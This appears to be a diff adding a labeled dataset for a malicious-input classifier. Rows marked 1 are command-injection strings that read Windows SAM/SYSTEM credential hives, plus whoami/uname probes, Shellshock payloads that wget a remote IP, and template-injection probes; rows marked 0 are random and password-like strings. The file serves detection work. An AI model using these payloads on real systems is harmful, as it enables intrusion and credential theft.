+&& type C:\Windows\repair\SAM,1
+type C:\Windows\repair\SAM,1
+| type C:\Windows\repair\SYSTEM,1
+; type C:\Windows\repair\SYSTEM,1
+& type C:\Windows\repair\SYSTEM,1
+&& type C:\Windows\repair\SYSTEM,1
+type C:\Windows\repair\SYSTEM,1
+| type C:\WINNT\repair\SAM,1
+; type C:\WINNT\repair\SAM,1
+& type C:\WINNT\repair\SAM,1
+&& type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SYSTEM,1
+| type %SYSTEMROOT%\repair\SAM,1
+; type %SYSTEMROOT%\repair\SAM,1
+& type %SYSTEMROOT%\repair\SAM,1
+&& type %SYSTEMROOT%\repair\SAM,1
+type %SYSTEMROOT%\repair\SAM,1
+| type %SYSTEMROOT%\repair\SYSTEM,1
+; type %SYSTEMROOT%\repair\SYSTEM,1
+& type %SYSTEMROOT%\repair\SYSTEM,1
+&& type %SYSTEMROOT%\repair\SYSTEM,1
+type %SYSTEMROOT%\repair\SYSTEM,1
+uname,1
+;uname;,1
+| uname -a,1
+; uname -a,1
+& uname -a,1
+&& uname -a,1
+uname -a,1
+;/usr/bin/id|,1
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",1
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,1
+| wget http://crowdshield.com/.testing/rce.txt,1
+& wget http://crowdshield.com/.testing/rce.txt,1
+; wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),1
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,1
+wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+which curl,1
+which gcc,1
+which nc,1
+which netcat,1
+which perl,1
+which python,1
+which wget,1
+whoami,1
+| whoami,1
+; whoami,1
+' whoami,1
+' || whoami,1
+' & whoami,1
+' && whoami,1
+'; whoami,1
+""" whoami",1
+""" || whoami",1
+""" | whoami",1
+""" & whoami",1
+""" && whoami",1
+"""; whoami",1
+$(`whoami`),1
+& whoami,1
+&& whoami,1
+"{{ get_user_file(""C:\boot.ini"") }}",1
+"{{ get_user_file(""/etc/hosts"") }}",1
+{{4+4}},1
+{{4+8}},1
+{{person.secret}},1
+{{person.name}},1
+{1} + {1},1
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",1
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},1
+Velvety2023,0
+Whimsical987,0
+Harmony456,0
+Luminous123,0
+Serenade2022,0
+Majestic789,0
+Captivate2021,0
+Tranquil567,0
+Enchant2024,0
+Radiant345,0
+Splendid2025,0
+Jovial234,0
+Melody2026,0
+Ethereal678,0
+Curious2027,0
+Blossom1234,0
+Vivid2028,0
+Cherish1235,0
+Enchanting2029,0
+Serene7890,0
+Melodious2030,0
+Jubilant890,0
+Evoke2031,0
+Mystic12345,0
+Whisper2032,0
+Radiant456,0
+Dreamy2033,0
+Harmonic567,0
+Allure2034,0
+Whimsy2345,0
+Delightful2035,0
+Cascading678,0
+Blissful2036,0
+Flourish7890,0
+Elegance2037,0
+Captivating8901,0
+Serenity2038,0
+Jubilant9012,0
+Velvety2039,0
+Cherished0123,0
+Splendid2040,0
+Tranquil1234,0
+Vivid2041,0
+Melodious2345,0
+Ethereal2042,0
+Curious3456,0
+Radiance2043,0
+Whimsical4567,0
+Harmony2044,0
+Luminous5678,0
+xYtRbFpL,0
+jQwZnHmS,0
+aVxPcDmK,0
+qWsEdRfT,0
+mJkLpOqI,0
+zXcVbNmO,0
+tGhYjUkL,0
+dFgHjKlP,0
+rTgBnHvC,0
+yNkMjUoI,0
+cXvZbNmL,0
+uHjKlPiO,0
+iXmZbNmK,0
+wSdRfTgY,0
+lMjKpOqR,0
+bVcNkLpO,0
+vBnJmKlP,0
+gHnJmKlP,0
+oCvBnHjK,0
+pLmKjUhY,0
+fDmKjUoI,0
+qAsDfGpL,0
+xGhNjUoI,0
+rFgTbNmO,0
+vGhNjUkP,0
+yJhKlPmO,0
+zAqWmSkL,0
+wZbNjUoI,0
+pCvNkLjU,0
+mTgBnHjK,0
+sXbVmOlP,0
+aDgHjKpL,0
+xVhNkLjU,0
+wSdFgHjK,0
+mJhNjUlP,0
+uJmKpOlI,0
+bTgBnHkL,0
+aQsWdFrT,0
+zBnJkLpO,0
+hJmKnUlI,0
+cZvBnHjK,0
+rFgHmKpL,0
+wZvBnHkL,0
+aQwRmSkL,0
+bVdFgHkL,0
+sBnJkLpO,0
+dFgHjUlK,0
+eZvBnHjU,0
+xZvBnHmK,0
+pCvBnJmK,0
+xYtRbFpL2023sQwZnHmS7d8eAvDmK4R6mB5s,0
+E9fT3Rf4tC1mJkL2qI0e2M3zX4bN5mO1i9T,0
+0gYj1UkL0o2P8fGhJkLlP5f8hI2rTgHvC2k,0
+4fY6NkMjUoI3i4cX7vZbL2m0i5uHjKlPiO5,0
+p2iXmZbN6mK2u3wSdRfTgY6u7lMjKpLqR2o,0
+U3bVcNkLpO5jKlP2u8gHnJmKlP7oCvNnHjK,0
+2rMpL7kU5hY2jX9DmKjUoI6gqAsFfGpL0j4,0
+x6GhUoI7j8R4Tg2N3O8o2bVh9Kp2mO8yJhK,0
+lPm2OzAqWmS5kL6Z5bNjUoI2x6NkLjU4R6T,0
+gB4jK5vM6bVmPlP5f8aDhKpL4xVh2kU4h6W,0
+w4SdFgH6jK2m9Jh5U2lP8uJm6KpO5I2bT,0
+5g4H9kL0r8Q1sW4fR3T6zB9j2Lp0O3hJm,0
+2nUlI9cZ5nHj2kL4rFg6KpL7wZ4nH5kL2,0
+s1aQ9mS5kL4j2bVdF8kL5g9v6sB8kL0p7,0
+d9FgHjU5kL3p1eZ9nHj2U8l4xZ9nH9kL7,0
+p6pC5nJ2mK0i7xYtRbFpL2sQwZnHmS7d8,0
+eAvDmK4R6mB5sE9fT3Rf4tC1mJkL2qI0e2,0
+M3zX4bN5mO1i9T0gYj1UkL0o2P8fGhJkLl,0
+P5f8hI2rTgHvC2k4fY6NkMjUoI3i4cX7vZ,0
+bL2m0i5uHjKlPiO5p2iXmZbN6mK2u3wSdR,0
+pLqR2oU3bVcNkLpO5jKlP2u8gHnJmKlP7,0
+oCvNnHjK2rMpL7kU5hY2jX9DmKjUoI6g0,0
+qAsFfGpL0j4x6GhUoI7j8R4Tg2N3O8o2bV,0
+h9Kp2mO8yJhKlPm2OzAqWmS5kL6Z5bNjU,0
+oI2x6NkLjU4R6TgB4jK5vM6bVmPlP5f8aD,0
+hKpL4xVh2kU4h6W4SdFgH6jK2m9Jh5U2lP,0
+8uJm6KpO5I2bT5g4H9kL0r8Q1sW4fR3T6z,0
+B9j2Lp0O3hJm2nUlI9cZ5nHj2kL4rFg6Kp,0
+L7wZ4nH5kL2s1aQ9mS5kL4j2bVdF8kL5g9,0
+v6sB8kL0p7d9FgHjU5kL3p1eZ9nHj2U8l4,0
+Enchanting,0
+Serene,0
+Jubilant,0
+Radiant,0
+Luminous,0
+Blossom,0
+Tranquil,0
+Allure,0
+Elegance,0
+Whimsical,0
+Enthralling,0
+Captivating,0
+Serendipity,0
+Harmonious,0
+Melodic,0
+Ethereal,0
+Delightful,0
+Whimsy,0
+Vivid,0
+Blissful,0
+Serenity,0
+Cozy,0
+Enchanted,0
+Graceful,0
+Radiance,0
+Breathtaking,0
+Jubilee,0
+Alluring,0
+Enchant,0
+Euphoria,0
+Tranquility,0
+Fascinating,0
+Captivate,0
+Harmony,0
+Melody,0
+Glorious,0
+Enraptured,0
+Delight,0
+Enliven,0
+Jubilance,0
+Vivacious,0
+Enthrall,0
+Enlivened,0
+Enrich,0
+Serenade,0
+Etherealness,0
+Majestic,0
+Pleasure,0
+Cheerful,0
+Charming,0
+bR5%lD3@pT,0
+Z7n#F4kT1q,0
+d9Ht$8N2sM,0
+Q2jB@5kT6v,0
+sM3%kP7@jT,0
+cG4&nS9#mL,0
+8@hJ3mL6$b,0
+XpT6$zN5kQ,0
+1#jS7kT4pL,0
+dP9%jK2@xR,0
+Hb6@zN3vK,0
+yP1&jT5$zM,0
+tN2@mR6%zD,0
+qF8@kN5mB,0
+TjM9%hS6$p,0
+VbL5$6jPmT,0
+K2@qT9nLzR,0
+pN7$RtK5jM,0
+Lq1$K9nT4s,0
+6@zP3tLbHk,0
+S9$jK5nM1q,0
+xQ7@mD4nBh,0
+zV2$kR8jTn,0
+mB6#L7jPzT,0
+3@tGhK6#nL,0
+P@ssw0rd!,0
+Secur1ty#,0
+MyP@ss123,0
+Pa$$w0rd123,0
+1234abcd!,0
+P@$$w0rd!,0
+Qwerty!234,0
+Passw0rd#,0
+Pa$$word123,0
+1LoveYou!,0
+Str0ngP@ss,0
+Pa$$w0rd1,0
+1234567a!,0
+H@ppyDay!,0
+Qwerty123!,0
+Pa$$w0rd123,0
+S3cur1ty!,0
+1234abcd!,0
+P@ssw0rd!,0
+Str0ngP@ss!,0
+Pa$$w0rd!,0
+MyS3cret!,0
+H@ppyD@ys,0
+1LoveYou!,0
+Pa$$word123,0
+S3cur3P@ss,0
+P@$$w0rd1,0
+1234567a!,0
+Str0ngP@ss!,0
+Pa$$w0rd123,0
+H@ppyD@ys!,0
+S3cur1ty!,0
+Pa$$word!,0
+MyP@ssw0rd,0
+1234abcd!,0
+P@$$w0rd!,0
+1LoveYou!,0
+H@ppyD@ys!,0
+S3cur3P@ss,0
+Pa$$w0rd123,0
+1234567a!,0
+Str0ngP@ss!,0
+MyS3cret!,0
+P@ssword!,0
+Pa$$w0rd!,0
+S3cur1ty!,0
+H@ppyDay!,0
+Str0ngP@ss!,0
+Pa$$w0rd123,0
+1234abcd!,0
